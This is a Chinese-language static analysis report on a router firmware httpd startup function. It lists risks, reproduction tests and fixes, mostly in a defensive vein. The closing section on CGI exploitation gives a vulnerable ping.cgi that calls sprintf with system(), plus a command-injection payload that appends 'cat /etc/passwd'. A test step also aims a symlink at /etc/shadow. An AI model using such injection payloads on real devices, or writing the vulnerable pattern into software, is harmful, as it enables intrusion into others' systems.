# HTTPD 启动函数（`sub_2E420`）静态分析报告

> 说明：本报告是根据反汇编/伪 C 开始，逐行分析 `sub_2E420` 及其依赖子函数的控制流、跳转去向、主循环行为，并标注每处**风险**、**复现/检测方法**与**修复建议**。

------

## 目录

- [概览](#概览)
- [主函数 `sub_2E420`：一览（精要）](#主函数-sub_2e420一览精要)
- [逐行 / 逐段详解（含子函数）](#逐行--逐段详解含子函数)
  - 初始化与 welcome 输出
  - 网络等待与 ConnectCfm
  - 读取 web/ssl/port 配置与 LAN IP 确定
  - 向内核发送 IP 信息（`tpi_talk_to_kernel`）
  - 载入用户凭证与写 PID
  - 信号注册 / `alarm` / mallopt
  - 主循环（事件分发、CGI、定时任务、malloc_trim）
  - SSL vs 非 SSL 分支与最终启动
- [被调用的关键子函数（简要）](#被调用的关键子函数简要)
  - `sub_30A5C`、`sub_103D0`、`sub_2ED58`、`sub_2E1B8`、`sub_2E240`
  - `sub_1C2EC`、`sub_1C7E8`、`sub_11868`、`sub_2E060`、`sub_1F294`、`sub_29704`、`sub_1B774`、`sub_10550`
- [文本流程图（带风险标注）](#文本流程图带风险标注)
- [风险索引（逐项：风险、复现、修复）](#风险索引逐项风险复现修复)
- [主循环逐行深度分析（含检测 & 修复建议）](#主循环逐行深度分析含检测--修复建议)
- [可执行检测/模糊测试清单（qemu/固件）](#可执行检测模糊测试清单qemu固件)
- [IDA 注释模板（可直接复制粘贴到 IDA 注释）](#ida-注释模板可直接复制粘贴到-ida-注释)
- [结论与下一步建议](#结论与下一步建议)

------

# 概览

`sub_2E420` 是该固件中 httpd 的启动/初始化入口（在没有 `main` 明显符号的二进制中它即为替代主入口）。总体流程：

1. 清理/初始化本地缓冲区（`s`、`v20`、`v21` 等）、初始化 core dump。

2. 打印欢迎信息并注册大量 signal handler（`sub_30A5C`）。

3. 等待网络就绪（`check_network`）并执行 `ConnectCfm` 校验。

4. 初始化内存池（`sub_103D0`）并读取 NVRAM/配置（`GetValue`）：

   - `lan.webiplansslen` → `sslenable`
   - `lan.webport` → `port`
   - `lan.webipen` → 控制逻辑（可能把 `sslport` 与 `port` 同设）

5. 获取 LAN IP（`getIfIp` 或 `lan.ip` / DHCP），写入 `g_lan_ip`。

6. 将 IP 封装并发送给内核（`tpi_talk_to_kernel`）。

7. 读取登陆用户/基础用户（`sub_2ED58`），写 PID 文件（`doSystemCmd("echo %d > /etc/httpd.pid")`）。

8. 注册少量信号处理（SIGTERM/SIGKILL尝试/SIGALRM）及 `alarm(60)`，调整 mallopt。

9. 进入主循环（`select` → dispatch → CGI cleanup → scheduled tasks → `malloc_trim`），直到 `dword_101AA0` 被置位。

10. 依据 `sslenable` 进入 SSL 或 非 SSL 初始化路径（`sub_1F294` 或 `sub_29704` / `sub_1B774`），并最终调用 `sub_10550` 做清理。

11. ## 整体功能

    `sub_2E420` 基本上就是这个 httpd 进程的初始化入口函数（相当于替代 `main` 的作用）。

    - 它初始化内存、信号、日志输出
    - 等待网络可用
    - 读取配置项（端口、IP、是否启用 SSL、用户名密码等）
    - 写入 PID 文件
    - 进入 **主循环**（监听 socket，处理 HTTP/CGI 请求，定期 trim 内存）
    - 最后根据 `sslenable` 选择进入 **SSL 模式** 或 **普通 HTTP 模式** 的执行函数。

    也就是说：**这段代码最终跳转到 HTTP/HTTPS 主循环里，开始提供 Web 服务。**

------

# 主函数 `sub_2E420`：一览（精要）

```c
int __fastcall sub_2E420(int a1, int a2)
{
  // ... 局部缓冲区初始化 ...
  init_core_dump(...);
  puts("WeLoveLinux ...");
  sub_30A5C(...); // 注册signals
  while ( check_network(v21) <= 0 ) sleep(1);
  sleep(1);
  if (ConnectCfm(...)) {
    sub_103D0(0, 61440, 1); // 内存/缓冲区
    // 读取配置并设置 sslenable, port, sslport 等
    // 获取 LAN IP -> g_lan_ip
    // 将 IP 转为 in_addr_t 后打包发送 tpi_talk_to_kernel(...)
    sub_2ED58(1); sub_2ED58(0); // 读取用户凭证
    doSystemCmd("echo %d > /etc/httpd.pid", pid);

    // 初始化 loginUserInfo
    signal(15, sub_2E1B8);
    signal(9, sub_2E1B8);    // 试图捕获 SIGKILL（无效）
    signal(14, sub_2E240);
    alarm(60);
    // mallopt 调整

    while (!dword_101AA0) {
      v10 = sub_1C2EC(-1, 1000); // select
      if (v10 > 0) v10 = sub_1C7E8(-1);
      v11 = sub_11868(v10); // CGI 管理
      sub_2E060(v11);       // scheduled tasks
      if (!(++v25 % 100)) malloc_trim(0);
    }

    if (sslenable) v12 = sub_1F294();
    else { v13 = sub_29704(); v12 = sub_1B774(v13); }
    sub_10550(v12);
    return 0;
  } else {
    printf("connect cfm failed!");
    return 0;
  }
}
```

------

# 逐行 / 逐段详解（含子函数）

> 以下逐段解释每一步在做什么、设计目的、以及可能的安全/稳定性问题与建议。

------

## 初始化与 welcome 输出

```c
v2 = memset(s, 0, sizeof(s));
dest[0] = 0;
dest[1] = 0;
memset(v21, 0, sizeof(v21));
memset(v20, 0, sizeof(v20));
v18 = 0;
init_core_dump(v2);
v3 = puts("... WeLoveLinux ...");
sub_30A5C(v3);
```

- 作用：清理本地缓冲区、调用 `init_core_dump`（可能设置 core 文件路径或限制），打印欢迎信息，调用 
- `sub_30A5C` 注册一系列 signal handlers。
- 风险点：`init_core_dump` 的具体实现若涉及路径处理或 shell 调用需要审计；`sub_30A5C` 注册的 handler 可能调用不安全函数（详见下文）。

------

## 网络等待与 ConnectCfm

```c
while ( check_network(v21) <= 0 )
    sleep(1u);
v4 = sleep(1u);
if ( ConnectCfm(v4) ) { ... } else { printf("connect cfm failed!"); return 0; }
```

- 作用：轮询直到网络就绪，然后执行 ConnectCfm 校验（可能是与某控制服务或上游链路的确认）。
- 风险点：
  - 无限阻塞：若网络永久不可用，httpd 将一直阻塞不启动（应有超时或降级机制）。
  - `ConnectCfm` 未知实现可能会阻塞或依赖远端服务，需审计。

------

## 初始化内存/缓冲池

```c
sub_103D0(0, 61440, 1);
```

- 作用：为某些内核缓冲/库分配或初始化内存池（如果第一个参数为 NULL 则在内部 malloc）。
- 风险点：若 malloc 失败需有错误处理，当前调用返回值未立即检查（但 `sub_103D0` 会返回错误码），应该验证。

`sub_103D0` 简要：

```c
int __fastcall sub_103D0(void *a1, int a2, int a3) {
  // dword_1019FC++ ; 如果首次调用且 a1 为 NULL ，malloc(size)
  // 初始化 dword_1019F8/1019F4/1019F0/1019EC 等全局
}
```

------

## 读取 web/ssl/port 配置

```c
memset(s,0,sizeof(s));
if (!GetValue("lan.webiplansslen", s)) strcpy(s,"0");
sslenable = atoi(s);

if (!GetValue("lan.webport", s)) strcpy(s,"80");
if (!GetValue("lan.webipen", dest)) strcpy((char *)dest, "0");
if (!strcmp((const char *)dest, "1")) { sslport = atoi(s); port = atoi(s); }
```

- 作用：读取 `lan.webiplansslen` 决定是否启用 SSL；读取 web 端口；读取 `lan.webipen` 决定某个启用标志；如果 `webipen == "1"`，就把 `sslport` 与 `port` 都设为 `webport`。
- 风险点：
  - `GetValue` 的实现必须保证不会写出目标缓冲边界；当前使用 `strcpy`（无长度限制）是潜在溢出点。
  - 将 `sslport` 与 `port` 设为相同值可能是逻辑错误（端口冲突），或造成监听逻辑异常。

------

## 获取 LAN IP（接口或配置或 DHCP）

```c
LanIfName = getLanIfName();
if (getIfIp(LanIfName, v20) < 0) {
  GetValue("lan.ip", s);
  strcpy(g_lan_ip, s);
  memset(v17,0,sizeof(v17));
  if (!tpi_lan_dhcpc_get_ipinfo_and_status(v17) && v17[0])
    vos_strcpy(g_lan_ip, v17);
} else {
  vos_strcpy(g_lan_ip, v20);
}
```

- 作用：尝试从接口直接读取 IP，失败则读取配置 `lan.ip`，再失败则尝试 DHCP 信息。
- 风险点：
  - `strcpy(g_lan_ip, s)` 若 `g_lan_ip` 缓冲空间小或 `s` 超长会溢出（必须确认 `g_lan_ip` 大小）。
  - DHCP 返回的数据若未校验（格式、长度）也会导致问题。

------

## 打包 IP 并与内核通信

```c
memset(v19, 0, 9u);
v7 = inet_addr(g_lan_ip);
v19[0] = LOBYTE(v19[0]) | (v7 << 8);
LOBYTE(v19[1]) = HIBYTE(v7);
tpi_talk_to_kernel(5, v19, &v18, 0, 0, 0, a2, a1);
```

- 作用：把 `g_lan_ip` 转成 `in_addr_t` 并以某种字节布局打包到 `v19`，通过 `tpi_talk_to_kernel` 发送到内核/驱动（op=5）。
- 风险点：
  - `inet_addr` 在非法地址会返回 `INADDR_NONE`（0xFFFFFFFF），需要检测；否则会将非法值发送至 kernel。
  - `tpi_talk_to_kernel` 是高权限交互点，应确保参数经过严格校验。

------

## 读取用户凭证、写 PID

```c
sub_2ED58(1); sub_2ED58(0);
v8 = getpid();
v9 = doSystemCmd("echo %d > %s", v8, "/etc/httpd.pid");
if ( sub_2E9EC(v9) >= 0 ) { ... }
else { puts("main -> initWebs failed"); return -1; }
```

- 作用：载入 `sys.username/sys.userpass` 和 `sys.baseusername/sys.baseuserpass`；写 PID 文件。
- 风险点：
  - 凭证在内存为明文（如果设备被本地攻破或内存泄露可读），应至少摘要或限制访问。
  - 写 PID 使用 shell 命令（`system()`）存在 TOCTOU 或注入风险（建议使用直接 open/write）。

------

## 信号注册、alarm、mallopt

```c
memset(&loginUserInfo, 0, 0x6C);
signal(15, sub_2E1B8);
signal(9, sub_2E1B8);   // 试图捕获 SIGKILL（无效）
signal(14, sub_2E240);
alarm(0x3C);
v25 = 0;
mallopt(-1, 0);
mallopt(-3, 2048);
v24 = getpid();
```

- 作用：清 loginUserInfo 并设置信号，使用 `alarm` 做定时触发，调整 malloc 行为。
- 风险点：
  - 试图捕获 SIGKILL（9）是无效的：内核不允许捕获 SIGKILL。
  - signal handler (`sub_2E1B8`, `sub_2E240`) 内如果调用非 async-signal-safe 函数（如 malloc/printf/IO）会导致不确定性。
  - `mallopt` 的错误参数可能导致 allocator 行为异常（需确认）。

------

## 主循环（事件驱动）

```c
while (!dword_101AA0) {
  v10 = sub_1C2EC(-1, 1000);
  if (v10 > 0) v10 = sub_1C7E8(-1);
  v11 = sub_11868(v10);
  sub_2E060(v11);
  if (!(++v25 % 100)) malloc_trim(0);
}
```

- 作用：核心的事件循环：构造 fd_set 并 `select()`（`sub_1C2EC`）→ dispatch sockets（`sub_1C7E8`）→ CGI 管理/清理（`sub_11868`）→ scheduled tasks（`sub_2E060`）→ 定期回收 heap（`malloc_trim`）。
- 关键风险点在这几个子函数（见下文）。

------

## SSL vs 非 SSL 初始化与结束

```c
if (sslenable) v12 = sub_1F294();
else { v13 = sub_29704(); v12 = sub_1B774(v13); }
sub_10550(v12);
return 0;
```

- 作用：根据 `sslenable` 选择 SSL 或 常规 HTTP 初始化路径，最终调用 `sub_10550` 做清理（可能释放上面 `sub_103D0` 分配的内存）。
- 风险点：SSL 初始化（`sub_1F294`）需确认私钥/证书加载路径、权限及支持的 TLS 参数是否安全。

------

# 被调用的关键子函数（简要）

> 这些函数在上文主要流程中被多次引用，下面列出它们的作用要点（基于你提供的伪代码）：

### `sub_30A5C`（signal 注册）

```c
__sighandler_t sub_30A5C() {
  signal(10, Term_Sig_entry); signal(12, Term_Sig_entry); signal(15, Term_Sig_entry);
  signal(13, 1); signal(1, Bad_Sig_entry); signal(17, 1);
  signal(6, Bad_Sig_entry); signal(6,1);
  signal(14, Bad_Sig_entry); ...
  return signal(25, Bad_Sig_entry);
}
```

- 注册大量信号 handler 并对若干 signal 做忽略 (`1`)。
- 风险：在 handler 中的逻辑需检查是否安全（避免在 handler 中调用 malloc/IO 等）。

------

### `sub_103D0`（内存/缓冲池初始化）

简要：如果传入指针为 NULL，按 `size` malloc，并初始化相关全局指针与计数器。

------

### `sub_2ED58`（读取凭证）

```c
if (a1 == 1) GetValue("sys.username", &g_User); return GetValue("sys.userpass", &g_Pass);
else GetValue("sys.baseusername", &unk_101AA4); return GetValue("sys.baseuserpass", &unk_101AE4);
```

- 作用：读入系统用户/密码或 base 用户/密码。

------

### `sub_2E1B8`（signal handler）

```c
if (result == 15) dword_101AA0 = 1;
else if (result == 9) { if (sslenable) ... sub_10550(...); exit(1); }
return result;
```

- 作用：收到 SIGTERM 设置退出标志；收到 SIGKILL（试图）则做服务重启或退出（但 SIGKILL 无法捕获）。
- 风险：handler 内部调用了可能不是 async-signal-safe 的函数（如 sub_1F294、sub_1B774 等），这是不安全的。

------

### `sub_2E240`（SIGALRM handler：会话过期清理）

- 作用：每 60 秒被 `alarm` 触发，遍历 `loginUserInfo` 检查会话超时并清理 cookie/登录信息，然后重新设置 `alarm(60)`。
- 风险：在 signal handler 中执行复杂逻辑（printf、strrchr、atoi、memset），这些并非 async-signal-safe。

------

### `sub_1C2EC`（select 封装）

- 作用：动态构造 fd_set（读/写/except），调用 `select`，并把事件标记回 socketList 中对应的结构（设置 flags）。
- 风险：动态分配 fd_set（通过 `sub_105E0`）若未检查返回值或边界，可能溢出或访问非法内存。

------

### `sub_1C7E8`（socket 事件分发）

- 作用：遍历 socketList，根据条件调用 `sub_1C130` / `sub_1C8DC` 处理 socket 事件。
- 风险：处理过程可能在处理时关闭 socket 或释放结构，若没有引用计数/锁可能造成 race。

------

### `sub_11868`（CGI 管理 / 清理）

- 作用：遍历 CGI 任务队列，轮询其输出/结束，若没有输出或超时则生成错误响应，删除临时文件并释放资源。
- 风险（高）：对临时路径 `v1[1]`, `v1[2]` 直接 `unlink` —— 若临时路径可被攻击者预测/替换，会发生 TOCTOU / symlink 攻击，导致任意文件被删除或覆盖。

------

### `sub_2E060`（scheduled task 调度）

- 作用：检查到期定时任务并调用 `sub_2DD3C` 执行。
- 风险：任务执行需独立错误处理与隔离，避免主循环阻塞或崩溃。

------

### `sub_1F294`（SSL 初始化）

- 作用：封装调用 TLS 库/加载证书与私钥，然后返回句柄。
- 风险：证书/私钥加载路径与权限、TLS 参数（协议版本/cipher）需核查。

------

### `sub_29704` / `sub_1B774`（非 SSL 初始化）

- 作用：刷新 webs 结构（mime、handlers）、socket 检查与创建监听等。

------

### `sub_10550`（清理释放）

- 作用：当 `dword_1019FC` 递减到 0 且 `dword_FFC48 & 2 == 0` 时释放 `dword_1019EC` 指向的内存。

------

# 文本流程图（带关键风险标注）

```lua
                              +---------------------+
                              |   entry -> start    |
                              +----------+----------+
                                         |
                                         v
                     +------------------+------------------+
                     |  sub_2E420() 初始化 (内存/变量/core)  |
                     |  memset(s), dest=0, init_core_dump  |
                     +------------------+------------------+
                                         |
                                         v
                     +------------------+------------------+
                     | puts("WeLoveLinux...")              |
                     | sub_30A5C() -> 注册大量 signal handlers
                     |  (SIGTERM,SIGALRM,... )             |
                     +------------------+------------------+
                                         |
                                         v
                     +------------------+------------------+
                     | while(check_network(v21) <= 0)      |
                     |     sleep(1)                         |
                     |  → 等待网络就绪                      |
                     +------------------+------------------+
                                         |
                                         v
                     +------------------+------------------+
                     | v4 = sleep(1);                          |
                     | if ( ConnectCfm(v4) ) {                |
                     |   sub_103D0(0, 61440, 1)  ← 内存池/缓冲 |
                     +------------------+------------------+
                                         |
    +------------------------------------+---------------------------------+
    |                                                         |
    v                                                         v
+---+---+                                                 +---+---+
| Load  |                                                 | fail  |
| config|                                                 | ConnectCfm -> |
| (GetValue)                                             | printf & return |
+---+---+                                                 +---------------+
    |
    v
+-------------------------------------------------------+
| Read: lan.webiplansslen -> sslenable                  |
| Read: lan.webport -> s  (default "80")                |
| Read: lan.webipen -> dest (default "0")               |
| if dest == "1": sslport = atoi(s); port = atoi(s)     |  <-- RISK #1 																																			(port/sslconf)
+-------------------------------------------------------+
    |
    v
+-------------------------------------------------------+
| LanIfName = getLanIfName();                           |
| if getIfIp(LanIfName, v20) < 0:                       |
|    GetValue("lan.ip", s); strcpy(g_lan_ip, s);        |  <-- RISK #2 (strcpy 																																	-> overflow)
|    if (tpi_lan_dhcpc_get_ipinfo_and_status(v17)) ...  |
| else: vos_strcpy(g_lan_ip, v20);                      |
+-------------------------------------------------------+
    |
    v
+-------------------------------------------------------+
| v7 = inet_addr(g_lan_ip);                             |
| pack v7 -> v19 bytes;                                  |
| tpi_talk_to_kernel(5, v19, &v18, ..., a2, a1);        |  <-- RISK #3 (kernel 																																				iface)
+-------------------------------------------------------+
    |
    v
+-------------------------------------------------------+
| sub_2ED58(1); sub_2ED58(0);  // load sys.username etc  |
+-------------------------------------------------------+
    |
    v
+-------------------------------------------------------+
| getpid(); doSystemCmd("echo %d > /etc/httpd.pid");    |  <-- RISK #4 (PID 																															write via shell)
+-------------------------------------------------------+
    |
    v
+-------------------------------------------------------+
| memset(&loginUserInfo);                                |
| signal(15, sub_2E1B8);  // SIGTERM                      |
| signal(9,  sub_2E1B8);  // attempted SIGKILL (invalid)  |  <-- RISK #5 (bad 																																	signal use)
| signal(14, sub_2E240); // SIGALRM -> session cleanup    |
| alarm(60); mallopt(...);                                |
+-------------------------------------------------------+
    |
    v
+-------------------------------------------------------+
| /* === 主循环 === */                                    |
| while (!dword_101AA0) {                                |
|   v10 = sub_1C2EC(-1, 1000);    // select + fd_set 构造  |  <-- RISK #6 																														(fd_set alloc/bounds)
|   if (v10 > 0) v10 = sub_1C7E8(-1);  // dispatch sockets |
|   v11 = sub_11868(v10);       // CGI handling          |  <-- RISK #7 (CGI 																														tmp files & unlink)
|   sub_2E060(v11);             // scheduled tasks       |
|   if (++v25 %100==0) malloc_trim(0);                  |
| }                                                     |
+-------------------------------------------------------+
    |
    v
+-------------------------------------------------------+
| if (sslenable) v12 = sub_1F294(); // SSL init           |  <-- RISK #8 (TLS 																																			config)
| else { v13 = sub_29704(); v12 = sub_1B774(v13); }      |
| sub_10550(v12); return 0;                              |
+-------------------------------------------------------+

```

------

# 风险索引（逐项：风险、复现方法、修复建议）

> 按优先级高→低排列，并给出直观复现/检测方法与修复建议。

### RISK #1 — SSL / port 配置混淆（中/高）

- **问题**：`if (dest == "1") { sslport = atoi(s); port = atoi(s); }` —— 可能把 SSL 与 HTTP 端口设为同一值。
- **复现**：设置 `lan.webport=443` 且 `lan.webipen=1`，观察绑定失败或日志报错。
- **修复**：分别配置 `sslport` 与 `port`，检测端口冲突并记录/拒绝不合理配置。

------

### RISK #2 — `strcpy(g_lan_ip, s)` & `GetValue` 未有边界检查（高）

- **问题**：用 `strcpy` 直接拷贝配置到 `g_lan_ip`，若 `s` 超长可能溢出。
- **复现**：在仿真环境设置 `lan.ip` 为超长字符串（> 128 字节），观察崩溃/内存损坏。
- **修复**：使用 `strlcpy`/`snprintf` 并限制 `GetValue` 的最大返回长度；在 IDA 确认 `g_lan_ip` 缓冲大小，增加断言。

------

### RISK #3 — `tpi_talk_to_kernel` 参数未验证（高）

- **问题**：把 ip 打包并发送内核，未校验 `inet_addr` 返回是否为 `INADDR_NONE` 等非法值。
- **复现**：把 `lan.ip` 设置为非法 IP（如 `999.999.999.999`），观察内核日志或异常行为。
- **修复**：使用 `inet_aton` / `inet_pton` 做严谨校验，前置格式验证并对非法地址拒绝或使用安全默认。

------

### RISK #4 — 写 PID 使用 shell 命令（中）

- **问题**：`doSystemCmd("echo %d > %s", pid, "/etc/httpd.pid")` 可能用 `system()` 实现。
- **复现**：检查 `doSystemCmd` 实现是否调用 `system()`；在设备上用 symlink 替换 `/etc/httpd.pid`，观察写入位置。
- **修复**：改为 `open("/etc/httpd.pid", O_WRONLY|O_CREAT|O_TRUNC, 0644)` + `dprintf`，避免 shell。

------

### RISK #5 — 信号处理不当（高）

- **问题**：试图捕获 SIGKILL（不可捕获）；signal handler 中调用复杂逻辑（非 async-signal-safe）。
- **复现**：发送 SIGTERM / SIGALRM，观察是否导致死锁或崩溃；审计 `sub_2E1B8`/`sub_2E240` 是否使用 `malloc/printf`。
- **修复**：signal handler 只设置 `volatile sig_atomic_t` 标志，由主循环处理；移除 SIGKILL 捕获尝试。

------

### RISK #6 — fd_set 分配 / 边界（高）

- **问题**：`v13 = (socketHighestFd + 32) >> 5` 等计算若输入异常会导致分配越界或 select 使用错误大小。
- **复现**：在固件或模拟器中人为设置极大 `socketHighestFd`，触发分配失败或 select 崩溃。
- **修复**：为 `socketHighestFd`/`socketMax` 设硬上限并校验；检查 `sub_105E0` 返回值并安全处理。

------

### RISK #7 — CGI 临时文件 unlink / TOCTOU（高）

- **问题**：`sub_11868` 在 CGI 完成后直接 `unlink` 临时路径（`v1[1]`, `v1[2]`），若路径可预测或已被替换为 symlink，将导致任意文件被删除。
- **复现**：在 tmp 目录下以目标名字创建 symlink 指向敏感文件，然后触发 CGI，使其删除该路径。
- **修复**：
  - 使用 `mkstemp()` 创建临时文件并通过 fd 操作；
  - 删除前使用 `lstat` 检查是否为 symlink / owner 是否符合；
  - 或使用 O_NOFOLLOW|O_EXCL 打开，避免跟随 symlink。

------

### RISK #8 — SSL/TLS 初始化与密钥管理（中/高）

- **问题**：证书或私钥若来自可写目录或加载策略不当，会泄露私钥或导致不安全 TLS 参数。
- **复现**：指定外部可写路径作为证书路径，尝试替换私钥文件，再观察 TLS 是否使用修改后的私钥。
- **修复**：强制证书/私钥存放于只读或受限路径，限制外部替换；仅启用 TLS >= 1.2 与强 cipher。

------

# 主循环逐行深度分析（含检测 & 修复建议）

> 这一节把主循环及其子调用逐步拆解，便于在 IDA 中定位关键漏洞点并在仿真环境中测试。

## 1. `v10 = sub_1C2EC(-1, 1000);`（select 封装）

- **做什么**：
  - 计算 fd_set 所需大小：`v13 = (socketHighestFd + 32) >> 5` → `n = 4 * v13`；
  - 通过 `sub_105E0(4 * v13)` 为三个 fd_set 分配缓冲区；
  - 遍历 `socketList`，根据 socket 元数据把 fd bit 置入 read/write/except 集；
  - 设置 `timeout`（1s），调用 `select`；
  - 若 `select > 0`，再次遍历 socketList，把触发事件记录到 socket 结构的 flags。
- **风险**：
  - `socketHighestFd` 若被破坏可导致分配大或溢出；
  - `sub_105E0` 若返回 NULL 未检查就 `memset` 会 crash；
  - `socketList` / `socketMax` 若被污染会读到非法指针。
- **检测**：
  - 在 IDA 审计 `sub_105E0`，增加断点/日志观察返回值；
  - 在仿真设置异常 `socketHighestFd` 测试。
- **修复建议**：
  - 对 `socketHighestFd` 设合理上限；
  - 检查 `sub_105E0` 返回并在失败时进行 fallback；
  - 遍历前复制 `socketList` 的快照或使用引用计数/锁以避免并发修改。

## 2. `if (v10 > 0) v10 = sub_1C7E8(-1);`（事件分发）

- **做什么**：
  - 根据 `select` 返回的条件，遍历 socketList，调用 `sub_1C130`/`sub_1C8DC` 处理事件。
- **风险**：
  - 在处理 socket 时可能关闭并释放 socket 结构，若没有引用计数/锁会导致 race。
- **检测**：审计 `sub_1C130`/`sub_1C8DC`，模拟高并发短连接。
- **修复**：使用引用计数/临时拷贝事件列表，避免在遍历中直接释放结构。

## 3. `v11 = sub_11868(v10);`（CGI 管理）

- **做什么**：
  - 遍历 CGI 任务表，轮询 CGI 输出、等待结束、若没有输出则发送错误，删除临时文件并释放资源。
- **风险（高）**：
  - 临时文件直接 `unlink(path)` 存在 symlink/TOCTOU 风险；
  - 等待循环（最多 100 次）可能导致阻塞；
  - 删除与释放顺序需谨慎避免 use-after-free。
- **检测**：
  - 在 tmp 目录创建 symlink 并触发 CGI，检查是否删除敏感文件；
  - 制造卡死的 CGI 观察主循环是否被阻塞。
- **修复**：`mkstemp` + `fchown/fchmod`，删除前 `lstat` 检查；将 CGI 运行在隔离进程池并设置超时。

## 4. `sub_2E060(v11);`（scheduled tasks）

- **做什么**：
  - 按时间戳检查到期任务并调用执行函数 `sub_2DD3C`。
- **风险**：
  - 时间被篡改可能影响任务调度；
  - 任务执行错误未充分处理可能重复或崩溃主循环。
- **修复**：任务异常应捕获并记录，必要时隔离执行。

## 5. `if (!(++v25 % 100)) malloc_trim(0);`

- **作用**：回收堆内存给系统（glibc 的 `malloc_trim`）。
- **风险**：频繁调用会带来性能抖动；在嵌入式 libc 上可能无效。
- **建议**：改为基于碎片阈值触发或减少频率。

------

# 可执行检测 / 模糊测试清单（qemu / 固件）

将下面用例在仿真或设备上执行，观察崩溃日志 / 内核报错 / 服务异常，便能验证上文风险：

1. **配置注入测试**
   - 设置 `lan.ip` 为非常长字符串（例如 1024 字节），启动 httpd，观察是否崩溃（检测 `strcpy` 溢出）。
2. **非法 IP 测试**
   - 设置 `lan.ip = "999.999.999.999"` 或 `255.255.255.255`，观察 `tpi_talk_to_kernel` / 内核日志。
3. **端口冲突测试**
   - 设置 `lan.webport = 443` 且 `lan.webipen=1`，观察绑定行为及日志。
4. **CGI symlink TOCTOU 测试**
   - 在临时目录创建 symlink 指向关键文件（如 `/etc/shadow`），触发 CGI 产生临时文件名相同，观察 `unlink` 是否会删除目标。
5. **select / fd_set 压力测试**
   - 用脚本短时间内建立大量连接并快速断开，观察是否触发 crash（测试 `socketHighestFd` 边界）。
6. **signal 注入测试**
   - 向进程发送 SIGTERM / SIGALRM，在不同执行阶段观察是否崩溃或产生死锁（表明 handler 中调用不安全函数）。
7. **CGI 阻塞测试**
   - 启动一个长时间运行的 CGI，观察主循环是否被阻塞导致整体不可用。
8. **私钥替换测试（仅在安全可控环境）**
   - 将 TLS 私钥文件替换为其它文件，观察是否被加载并导致安全问题（用于验证证书管理）。

------

# IDA 注释模板（可直接复制粘贴到 IDA 的函数注释）

在 IDA 相应代码处粘以下注释模板以便追踪与复现：

- 在 `strcpy(g_lan_ip, s);` 所在行注释：

  ```less
  // RISK: potential buffer overflow.
  // Source: GetValue("lan.ip", s) -> s (no length check) -> strcpy(g_lan_ip, s)
  // Action: confirm size of g_lan_ip in data segment; test with oversized lan.ip string.
  // Fix: use strlcpy/snprintf and validate GetValue max length.
  ```

- 在 `doSystemCmd("echo %d > %s", ...)` 所在行注释：

  ```postgresql
  // RISK: uses shell to write PID (possible TOCTOU/command injection).
  // Action: inspect doSystemCmd implementation; if uses system(), replace with open/write.
  ```

- 在 `signal(9, ...)` 所在行注释：

  ```
  // BUG: attempts to catch SIGKILL (9). SIGKILL cannot be caught. Likely programmer error.
  // Also audit signal handlers for async-signal-safety (do not call malloc/printf in handler).
  ```

- 在 `tpi_talk_to_kernel(5, ...)` 所在行注释：

  ```
  // HIGH RISK: data sent to kernel driver. Validate inet_aton return and fields before sending.
  // Action: use inet_aton/inet_pton and check INADDR_NONE.
  ```

- 在 `unlink((const char *)v1[1]); unlink((const char *)v1[2]);`（CGI cleanup）行注释：

  ```
  // CRITICAL RISK: deleting temp files by path -> potential TOCTOU / symlink attack.
  // Action: verify how temp filenames are generated; prefer mkstemp() and unlink by fd or ensure O_NOFOLLOW.
  ```

- 在 `sub_1C2EC` fd_set alloc 处注释：

  ```
  // RISK: dynamic fd_set size computed from socketHighestFd.
  // Action: ensure socketHighestFd bounds; check sub_105E0 return; limit max fd to a sane value.
  ```

------

# 结论与下一步建议

- `sub_2E420` 为 httpd 的启动/主循环入口，最终将控制权交给 HTTP/HTTPS 服务（`sub_1F294` 或 `sub_29704`/`sub_1B774`）。
- 风险集中在以下几类（优先级从高到低）：
  1. CGI 临时文件 TOCTOU / symlink 删除（高）
  2. fd_set 分配 / socketHighestFd 边界（高）
  3. signal handler 中使用非 async-signal-safe 函数（高）
  4. 配置字符串 `strcpy` 溢出（高）
  5. 与内核交互（`tpi_talk_to_kernel`）参数验证（高）
  6. PID 写入使用 shell（中）
  7. SSL 私钥/证书管理（中/高）
  8. `malloc_trim` 滥用（低/中）

### 建议的顺序化行动项（短期 -> 中期）

1. 在 IDA 中确认 `g_lan_ip` 的定义长度与 `GetValue` 写入机制（立即检测 RISK #2）。
2. 审计 `sub_11868` 的临时文件生成逻辑，若存在 `mktemp`/`tmpnam` 或 predictable path，优先修复（RISK #7 优先级最高）。
3. 审查 `sub_1C2EC` 与 `sub_105E0`，加上 fd bounds 检查（RISK #6）。
4. 重构 signal handlers：在 handler 中仅设置标志，主循环处理实际清理（RISK #5）。
5. 把 PID 写入改为直接 open/write（RISK #4）。
6. 对 `tpi_talk_to_kernel` 的输入做严格验证（RISK #3）。
7. 审计 SSL 初始化与证书路径（RISK #8）。
8. 运行上文提供的 fuzz / 仿真测试用例，收集崩溃/日志以定位更多潜在问题。

------

## 1. CGI 概念

**CGI（Common Gateway Interface）** 是一种标准接口，用于 web 服务器和外部程序（通常称为 CGI 脚本）之间的交互。它允许 Web 服务器将 HTTP 请求的数据传递给外部程序处理，然后返回生成的 HTML 或其他内容给客户端。

**特点：**

- CGI 脚本可以用多种语言编写，如 **C、Perl、Python、Shell、PHP** 等。
- 每次请求 CGI 脚本时，服务器通常会新启动一个进程执行脚本。
- CGI 脚本通常用于动态生成网页或处理用户输入（如表单提交、上传文件、查询参数等）。

**文件路径特点：**

- CGI 脚本通常存放在 Web 服务器的特殊目录，例如 `/cgi-bin/`。
- 在嵌入式设备或路由器中，很多管理界面功能都是通过 CGI 实现的，例如 `/cgi-bin/admin.cgi` 或 `/cgi-bin/update.cgi`。

------

## 2. CGI 的安全问题

CGI 脚本容易成为攻击目标，主要原因有：

1. **输入未过滤**
   - 如果 CGI 脚本对 HTTP 参数或表单输入缺乏严格过滤，可能导致 **命令注入、文件包含、SQL 注入、路径遍历** 等漏洞。
2. **权限过高**
   - 有些 CGI 脚本运行在 root 权限下，如果存在漏洞，攻击者可以直接获取系统权限。
3. **信息泄露**
   - 错误配置或调试信息输出可能泄露敏感路径或密码。

------

## 3. 常见利用方法

在 IoT 安全或路由器渗透测试中，CGI 利用通常包含以下几个方向：

### (1) 命令执行（Command Injection）

如果 CGI 脚本直接将用户输入拼接到系统命令中，攻击者可以注入恶意命令：

**示例：**

假设路由器 CGI URL：

```
http://192.168.1.1/cgi-bin/ping.cgi?host=192.168.1.100
```

脚本内部可能执行：

```
char cmd[128];
sprintf(cmd, "ping -c 4 %s", host);
system(cmd);
```

**利用方法：**

```
host=192.168.1.100; cat /etc/passwd
```

